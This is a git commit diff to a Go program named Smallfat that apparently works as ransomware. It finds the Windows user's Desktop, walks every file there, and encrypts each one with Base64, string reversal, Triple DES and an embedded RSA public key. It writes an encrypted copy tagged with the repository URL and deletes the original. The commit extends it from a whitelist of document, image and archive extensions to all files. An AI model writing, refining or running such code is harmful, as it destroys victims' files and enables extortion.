50d18a13f0642350eacdf273cd58cd736de01483
RuanLang0777 <53397197+RuanLang0777@users.noreply.github.com>
2022-06-09 14:50:55 +0800

    Update Smallfat.go

--- encryption/Smallfat.go
+++ encryption/Smallfat.go
@@ -1,50 +1,28 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
-	"crypto/cipher"
-	"crypto/des"
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/x509"
 	"encoding/base64"
 	"encoding/pem"
+	"github.com/wumansgy/goEncrypt"
 	"io/ioutil"
 	"os"
 	"os/exec"
 	"path"
+	"path/filepath"
 	"strings"
+	"sync"
 )
 
 var (
-	WhiteList = map[string]string{ //加密文件白名单
-		//document
-		"word_before":  ".doc",
-		"word_after":   ".docx",
-		"excel_before": ".xls",
-		"excel_afte":   ".xlsx",
-		"powerpoint":   ".pptx",
-		"pdf":          ".pdf",
-		"wps_on":       ".dot",
-		"wps_two":      ".dotx",
-		"txt":          ".txt",
-		//images
-		"images1": ".jpg",
-		"images2": ".jpeg",
-		"images3": ".png",
-		"images4": ".gif",
-		"images5": ".bmp",
-		"images6": ".tiff",
-		"images7": ".ai",
-		"images8": ".cdr",
-		"images9": ".eps",
-		//compression
-		"rar": ".rar",
-		"7z":  ".7z",
-		"zip": ".zip",
-	}
-	key       = []byte("Smallfat") //密钥
-	publicKey = []byte(` 
+	wg        sync.WaitGroup
+	key       = []byte("FTXs8EjMOPhl6nLhvP7eAOGO")
+	ivdes     = []byte("FLAzc3RC")
+	PublicKey = []byte(`
 -----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtxlZg6F+OS+JnfjUZ7Hq
 QL1Mj/MTWUm9XmPLnCrrdEep36e50HtQqpzL8hYTPTGDW1B0do0u5EKDpZWGZVFO
@@ -64,118 +42,95 @@ func Del_File(fileName string) {
 	}
 }
 
-func Write_File(fileName string, RSAContent []byte) {
+func Encrypt(fileName string, key, publicKeyByte []byte) {
+	//Base64编码->反转->Base64编码
+	file_byte, _ := ioutil.ReadFile(fileName)
+	encryption := base64.StdEncoding.EncodeToString(file_byte)
+	Reverses := Reverse(encryption)
+	Reverses_Encryption := base64.StdEncoding.EncodeToString([]byte(Reverses)) //Base64密文
+	//三重DES CBC加密
+	DES_Encryption, _ := goEncrypt.TripleDesEncrypt([]byte(Reverses_Encryption), key, ivdes) //DES密文
+	//RSA加密
+	rsablock, _ := pem.Decode(publicKeyByte)
+	publicKey, _ := x509.ParsePKIXPublicKey(rsablock.Bytes)
+	keySize, DESSize := publicKey.(*rsa.PublicKey).Size(), len(DES_Encryption)
+	pub := publicKey.(*rsa.PublicKey)
+	offSet, once := 0, keySize-11
+	buffer := bytes.Buffer{}
+	for offSet < DESSize {
+		endIndex := offSet + once
+		if endIndex > DESSize {
+			endIndex = DESSize
+		}
+		bytesOnce, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, DES_Encryption[offSet:endIndex])
+		buffer.Write(bytesOnce)
+		offSet = endIndex
+	}
+	RSA_Encryption := buffer.Bytes() //RSA密文
 	//写入文件
-	content := `https://github.com/RuanLang0777/Smallfat` + "\r\n\r\n" + string(RSAContent)
+	content := `https://github.com/RuanLang0777/Smallfat` + "\r\n\r\n" + string(RSA_Encryption)
 	baseName := path.Base(fileName)           // 获取文件名+后缀
 	ext := path.Ext(baseName)                 // 获取后缀
 	name := strings.TrimSuffix(baseName, ext) //获取文件名
-	err := ioutil.WriteFile(name+"_Smallfat"+ext, []byte(content), 0777)
+	WriteFile, err := os.OpenFile(name+"_Smallfat"+ext, os.O_RDONLY|os.O_CREATE|os.O_APPEND, 0666)
+	if err != nil {
+		return
+	}
+	defer WriteFile.Close()
+	buf := bufio.NewWriterSize(WriteFile, len(RSA_Encryption))
+	buf.Write([]byte(content))
+	err = buf.Flush()
+	if err != nil {
+		return
+	}
 	Del_File(fileName)
+}
+
+func Reverse(base64 string) string {
+	//反转
+	str := []rune(base64)
+	for i, j := 0, len(str)-1; i < j; i, j = i+1, j-1 {
+		str[i], str[j] = str[j], str[i]
+	}
+	return string(str)
+}
+
+func Get_User() string {
+	//获取用户名
+	cmd := exec.Command("whoami")
+	out, _ := cmd.CombinedOutput()
+	whoami := strings.Split(string(out), "\\")[1]
+	paths := `C:\Users\` + whoami + `\Desktop`
+	desktop := strings.Replace(paths, "\r\n", "", 1)
+	return desktop
+}
+
+func WalkFunc(fileName string, info os.FileInfo, err error) error {
+	//遍历文件
+	if info.IsDir() {
+		return nil
+	}
+	if !strings.Contains(fileName, "_Smallfat") {
+		wg.Add(1)
+		go func() {
+			defer wg.Add(-1)
+			Encrypt(fileName, key, PublicKey)
+
+		}()
+		wg.Wait()
+		return nil
+	}
+	return nil
+
+}
+
+func Run(root string) {
+	err := filepath.Walk(root, WalkFunc)
 	if err != nil {
 		return
 	}
 }
 
-func Base64(fileName string) []byte {
-	//Base64编码->反转->Base64编码
-	file_byte, _ := ioutil.ReadFile(fileName)
-	encryption := base64.StdEncoding.EncodeToString(file_byte)
-	reverses := Reverse(encryption)
-	reverses_encryption := base64.StdEncoding.EncodeToString([]byte(reverses))
-	return []byte(reverses_encryption)
-
-}
-
-func MyDESEncrypt(origData, key []byte) []byte {
-	//DES加密
-	block, _ := des.NewCipher(key)
-	origData = PKCS5Padding(origData, block.BlockSize())
-	blockMode := cipher.NewCBCEncrypter(block, key)
-	crypted := make([]byte, len(origData))
-	blockMode.CryptBlocks(crypted, origData)
-	return crypted
-
-}
-
-func MyRSAEncrypt(src, publicKeyByte []byte) (bytesEncrypt []byte) {
-	//RSA加密
-	block, _ := pem.Decode(publicKeyByte)
-	publicKey, _ := x509.ParsePKIXPublicKey(block.Bytes)
-	keySize, srcSize := publicKey.(*rsa.PublicKey).Size(), len(src)
-	pub := publicKey.(*rsa.PublicKey)
-	offSet, once := 0, keySize-11
-	buffer := bytes.Buffer{}
-	for offSet < srcSize {
-		endIndex := offSet + once
-		if endIndex > srcSize {
-			endIndex = srcSize
-		}
-		bytesOnce, _ := rsa.EncryptPKCS1v15(rand.Reader, pub, src[offSet:endIndex])
-		buffer.Write(bytesOnce)
-		offSet = endIndex
-	}
-	bytesEncrypt = buffer.Bytes()
-	return
-}
-
-func PKCS5Padding(ciphertext []byte, blockSize int) []byte {
-	padding := blockSize - len(ciphertext)%blockSize
-	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
-	return append(ciphertext, padtext...)
-}
-
-func Reverse(enbase64 string) string {
-	//反转
-	a := []rune(enbase64)
-	for i, j := 0, len(a)-1; i < j; i, j = i+1, j-1 {
-		a[i], a[j] = a[j], a[i]
-	}
-	return string(a)
-}
-func Get_User() []string {
-	//获取用户名
-	cmd := exec.Command("whoami")
-	out, _ := cmd.CombinedOutput()
-	whoami := strings.Split(string(out), "\\")
-	return whoami
-}
-
-func WalkDir(filepath string) ([]string, error) {
-	//递归遍历文件
-	files, _ := ioutil.ReadDir(filepath) // 遍历所有文件/目录
-	var allfile []string                 //存放文件路径
-	for _, v := range files {
-		fullPath := filepath + "\\" + v.Name() // 全路径 + 文件/目录
-		if v.IsDir() {
-			a, _ := WalkDir(fullPath) // 递归遍历
-			allfile = append(allfile, a...)
-		} else {
-			allfile = append(allfile, fullPath) // 如果不是目录，追加至
-		}
-	}
-
-	return allfile, nil
-}
-
-func Smallfat() {
-	Users := Get_User()
-	paths := `C:\Users\` + Users[1] + `\Desktop`
-	desktop := strings.Replace(paths, "\r\n", "", 1)
-	files, _ := WalkDir(desktop)
-	for _, fileName := range files {
-		SuffixName := path.Ext(fileName)
-		for _, SuffixVule := range WhiteList {
-			if SuffixName == SuffixVule {
-				Base64Content := Base64(fileName)
-				DESContent := MyDESEncrypt(Base64Content, key)
-				RSAContent := MyRSAEncrypt(DESContent, publicKey)
-				Write_File(fileName, RSAContent)
-			}
-		}
-	}
-}
-
 func main() {
-	Smallfat()
+	Run(Get_User())
 }
